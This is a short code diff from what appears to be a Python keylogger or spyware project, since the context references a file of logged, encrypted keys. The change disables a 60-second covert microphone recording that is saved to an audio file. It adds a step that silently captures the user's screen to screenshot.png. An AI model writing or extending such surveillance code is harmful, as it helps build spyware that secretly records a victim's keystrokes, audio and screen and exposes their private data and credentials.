@@ -103,10 +103,16 @@ keys_information_enc = 'enc_keys_logged.txt'
 
 # Microphone
 
-sampling_freq = 44100
-duration = 60
+# sampling_freq = 44100
+# duration = 60
 
-myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
-sd.wait()
+# myrecording = sd.rec(int(duration * sampling_freq), samplerate=sampling_freq, channels=2)
+# sd.wait()
 
-write(audio_information, sampling_freq, myrecording)
+# write(audio_information, sampling_freq, myrecording)
+
+# Screenshotting
+
+screenshot = ImageGrab.grab()
+screenshot.save("screenshot.png")
+screenshot.close()
